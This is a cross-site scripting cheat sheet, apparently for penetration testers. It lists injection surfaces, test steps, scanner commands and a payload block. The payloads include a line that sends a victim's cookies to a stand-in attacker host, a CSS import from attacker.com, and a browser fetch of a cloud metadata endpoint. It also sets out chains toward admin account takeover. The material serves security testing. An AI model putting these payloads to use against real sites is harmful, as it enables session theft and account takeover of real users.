# XSS Techniques

> Cross-Site Scripting — injecting executable JavaScript into a page context to steal sessions, exfiltrate data, or chain to further exploitation.

## Surface

- User-controlled input reflected in HTML body, attributes, or JS variables
- DOM sinks: `innerHTML`, `document.write`, `eval`, `location.href`, `setTimeout(str)`
- JSON responses used directly in `<script>` blocks without escaping
- SVG upload endpoints — SVG is HTML-parsed, `<script>` executes
- Template engines with raw output: Jinja2 `{{ }}`, Handlebars `{{{ }}}`, Angular `[innerHTML]`
- `X-Forwarded-For`, `Referer`, `User-Agent` headers reflected in error pages or logs
- Stored XSS in names, bios, comments, ticket titles — anything displayed to other users
- Admin panels rendering user-supplied data — stored XSS here escalates to admin session

## Test Approach

1. **Map all input sinks** — use Burp passive scan + manual review of JS source for DOM sinks
2. **Test reflection with a canary**: `"><img src=x onerror=alert(1)>` — look for unescaped output
3. **Attribute injection**: `" autofocus onfocus=alert(1) x="` for attribute contexts
4. **JS string injection**: `'; alert(1); //` or `\'; alert(1); //` in JS variable contexts
5. **DOM XSS**: trace `location.hash`, `URL`, `document.referrer` → DOM sinks in browser console
6. **WAF bypass**: use dalfox for automated bypass attempts:
   ```
   dalfox url "https://target.com/search?q=FUZZ" \
     --waf-bypass --silence --output results.txt
   ```
7. **Stored XSS sweep** — inject payloads in every profile/settings field; check how each field renders in other views (admin panel, email preview, PDF export)
8. **Header-based XSS** — set `X-Forwarded-For: <script>alert(1)</script>` and trigger an error page

## Tools

- **dalfox** — parameter-aware XSS scanner with WAF bypass; `dalfox url "https://target.com/search?q=test"`
- **XSStrike** — context-aware payload generation; `python3 xsstrike.py -u "https://target.com/?q=test"`
- **DOM Invader** (Burp) — traces DOM sources and sinks in browser context
- **nuclei** — template-based XSS detection: `nuclei -t xss/ -u https://target.com`

## Payloads / Probes

```html
<!-- Basic reflection test -->
"><img src=x onerror=alert(document.domain)>

<!-- Attribute context -->
" autofocus onfocus="alert(1)

<!-- JS string break -->
'; alert(document.cookie); //

<!-- SVG payload -->
<svg onload=alert(1)>

<!-- Template/Angular injection -->
{{constructor.constructor('alert(1)')()}}

<!-- Stored XSS — cookie exfil -->
<img src=x onerror="fetch('https://collab.attacker.com/?c='+document.cookie)">

<!-- CSS injection fallback (restricted contexts) -->
<style>@import 'https://attacker.com/steal.css'</style>
```

## Chain Opportunities

- **Stored XSS → Admin ATO** — payload fires in admin panel, exfiltrates CSRF token or session cookie
- **XSS + CSRF** — use XSS to perform state-changing actions bypassing SameSite cookies
- **XSS → SSRF** — `fetch('http://169.254.169.254/latest/meta-data/')` from victim browser
- **DOM XSS → prototype pollution** — pollute Object.prototype via `__proto__` in DOM sink
- **Reflected XSS → phishing** — crafted link with payload, delivered via open redirect

## Recent Intel

- **CVE-2023-24488** · Citrix Gateway open redirect + stored XSS in admin interface, bypass via URL param manipulation · https://www.assetnote.io/resources/research/advisory-citrix-gateway-open-redirect-and-xss-cve-2023-24488
- **Citrix Gateway firmware XSS** · Reverse-engineered admin panel revealed stored XSS via session parameter, auth context bypass · https://www.assetnote.io/resources/research/reversing-citrix-gateway-for-xss
- **Inline style exfiltration** · CSS injection via `style` attributes (no `<style>` block needed) leaks CSRF tokens char-by-char via background-image requests · https://portswigger.net/research/inline-style-exfiltration
